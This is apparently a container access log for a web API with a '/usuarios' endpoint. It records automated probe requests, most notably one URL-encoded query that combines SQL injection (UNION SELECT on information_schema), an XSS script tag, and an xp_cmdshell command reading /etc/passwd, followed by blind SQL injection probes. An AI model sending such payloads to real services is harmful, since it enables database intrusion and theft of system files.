api-1  | INFO:     Started server process [1]
api-1  | INFO:     Waiting for application startup.
api-1  | INFO:     Application startup complete.
api-1  | INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
api-1  | INFO:     172.18.0.1:59950 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59962 - "GET /usuarios?pMsL=5727%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59974 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:59976 - "GET /3923 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59984 - "GET /usuarios%28%2C.%27.%22%29.%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:59998 - "GET /usuarios%27PrCXTU%3C%27%22%3EDEIiix HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60026 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:60014 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/4028%3D3267/%2A%2A/AND/%2A%2A/%281799%3D1799 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60034 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/7086%3D7086/%2A%2A/AND/%2A%2A/%289018%3D9018 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60038 - "GET /usuarios/%2A%2A/AND/%2A%2A/1321%3D1988 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60042 - "GET /usuarios/%2A%2A/AND/%2A%2A/7086%3D7086 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60050 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/7238%3D4927/%2A%2A/AND/%2A%2A/%28%27ADsB%27%3D%27ADsB HTTP/1.1" 404 Not Found
